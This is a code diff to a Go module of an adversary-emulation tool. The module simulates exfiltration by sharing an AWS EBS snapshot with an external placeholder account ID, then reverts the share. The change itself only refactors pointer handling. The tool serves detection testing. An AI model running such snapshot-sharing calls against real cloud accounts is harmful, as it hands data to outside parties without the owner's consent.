@@ -3,7 +3,6 @@ package aws
 import (
 	"context"
 	_ "embed"
-	"github.com/aws/aws-sdk-go-v2/aws"
 	"github.com/aws/aws-sdk-go-v2/service/ec2"
 	"github.com/aws/aws-sdk-go-v2/service/ec2/types"
 	"github.com/datadog/stratus-red-team/internal/providers"
@@ -39,7 +38,7 @@ Detonation:
 	})
 }
 
-const ShareWithAccountId = "012345678912"
+var ShareWithAccountId = "012345678912"
 
 func detonate(params map[string]string) error {
 	ec2Client := ec2.NewFromConfig(providers.AWS().GetConnection())
@@ -51,10 +50,10 @@ func detonate(params map[string]string) error {
 	log.Println("Sharing the volume snapshot " + ourSnapshotId + " with an external AWS account...")
 
 	_, err := ec2Client.ModifySnapshotAttribute(context.Background(), &ec2.ModifySnapshotAttributeInput{
-		SnapshotId: aws.String(ourSnapshotId),
+		SnapshotId: &ourSnapshotId,
 		Attribute:  types.SnapshotAttributeNameCreateVolumePermission,
 		CreateVolumePermission: &types.CreateVolumePermissionModifications{
-			Add: []types.CreateVolumePermission{{UserId: aws.String(ShareWithAccountId)}},
+			Add: []types.CreateVolumePermission{{UserId: &ShareWithAccountId}},
 		},
 	})
 	return err
@@ -66,10 +65,10 @@ func revert(params map[string]string) error {
 
 	log.Println("Unsharing the volume snapshot " + ourSnapshotId)
 	_, err := ec2Client.ModifySnapshotAttribute(context.Background(), &ec2.ModifySnapshotAttributeInput{
-		SnapshotId: aws.String(ourSnapshotId),
+		SnapshotId: &ourSnapshotId,
 		Attribute:  types.SnapshotAttributeNameCreateVolumePermission,
 		CreateVolumePermission: &types.CreateVolumePermissionModifications{
-			Remove: []types.CreateVolumePermission{{UserId: aws.String(ShareWithAccountId)}},
+			Remove: []types.CreateVolumePermission{{UserId: &ShareWithAccountId}},
 		},
 	})
 	return err
